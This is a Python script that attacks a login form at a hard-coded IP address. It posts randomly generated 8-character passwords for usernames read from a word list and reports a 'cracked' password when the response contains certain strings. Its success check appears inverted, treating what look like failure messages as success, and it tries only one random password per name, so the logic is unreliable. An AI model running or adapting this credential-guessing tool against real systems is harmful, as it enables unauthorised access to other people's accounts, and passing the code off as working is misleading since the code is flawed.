import requests
import os
import random
import string
import json

target_url = 'http://83.160.88.114:8080'
if_contains_then_invalid = ['not permission', 'is_invalid']

def post_it(name):
    chars = string.ascii_letters + string.digits
    # random.seed = (os.urandom(1024))
    # name = name.join(random.choice(string.digits)) # Salt

    username = name.lower()
    password = ''.join(random.choice(chars) for i in range(8))

    response = requests.post(target_url, allow_redirects=False, data={
        'username': username,
        'password': password,
        'Submit': "submit"
    })

    print('Testing password '+password+' on '+username)
    if any(if_contain_then_invalid in str(response.content) for if_contain_then_invalid in if_contains_then_invalid):
        print("[+] {}s password is {}".format(username, password))
        exit(0)

if __name__ == "__main__":
    names = json.loads(open('words.json').read())
    for name in names:
      post_it(name)
